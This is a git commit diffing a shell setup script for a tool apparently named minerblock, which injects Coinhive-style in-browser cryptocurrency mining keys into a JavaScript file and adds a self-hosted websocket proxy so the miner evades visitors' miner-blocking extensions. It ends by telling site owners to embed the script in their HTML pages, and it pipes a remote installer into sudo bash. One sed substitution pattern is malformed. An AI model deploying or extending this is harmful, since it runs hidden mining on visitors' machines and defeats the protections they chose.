1ec37e9f8dc01027caa207ca07f0474009ad7e23
SkyrisBactera <davis.davalos.delosh@gmail.com>
2017-11-23 15:16:07 -0700

    Adding proxy capibility

--- setup.sh
+++ setup.sh
@@ -12,6 +12,36 @@ echo Substituting the keys into $minerblock...
 sed -i 's/cHive/'$cHiveKey'/g' $minerblock
 sed -i 's/cLoot/'$cLootKey'/g' $minerblock
 sed -i 's/cCoins/'$cCoinsKey'/g' $minerblock
-
-echo Put the following into your HTML files that you want to have protection against Minerblockers:
-echo '<script src="'$minerblock'"></script>'
+echo Do you want to enable proxy functionality? This is very recommended, however, your computer/server would have to host it (y/n)
+read proxyYes
+declare -l proxyYes
+proxyYes=$proxyYes
+if [ "$proxyYes" == "y" ]; then
+  echo Checking dependencies...
+  if hash npm 2>/dev/null; then
+    sudo npm install -g coin-hive-stratum
+  else
+    echo Installing node...
+    curl -sL https://deb.nodesource.com/setup_9.x | sudo -E bash -
+    echo Enter your password in order to install Node.js
+    sudo apt-get install -y nodejs
+    sudo npm install -g coin-hive-stratum
+  fi
+  echo Do you have a domain name?
+  read domainYes
+  declare -l domainYes
+  domainYes=$domainYes
+  if [ "$domainYes" == "y" ]; then
+    echo What is your domain name?
+    read domainName
+  else
+    domainName=$(dig +short myip.opendns.com @resolver1.opendns.com)
+  fi
+    echo Substituting the proxy into $minerblock...
+    port=$(shuf -i 2000-65000 -n 1)
+    strSub='CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://'$domainName':'$port'"]];'
+    sed -i 's/////strSub/'$strSub'/g' $minerblock
+    echo You need to run proxy.sh along with whatever server software you are using as long as you want Coinhive to work
+fi
+  echo You need to put the following into your HTML files that you want to have protection against Minerblockers:
+  echo '<script src="'$minerblock'"></script>'
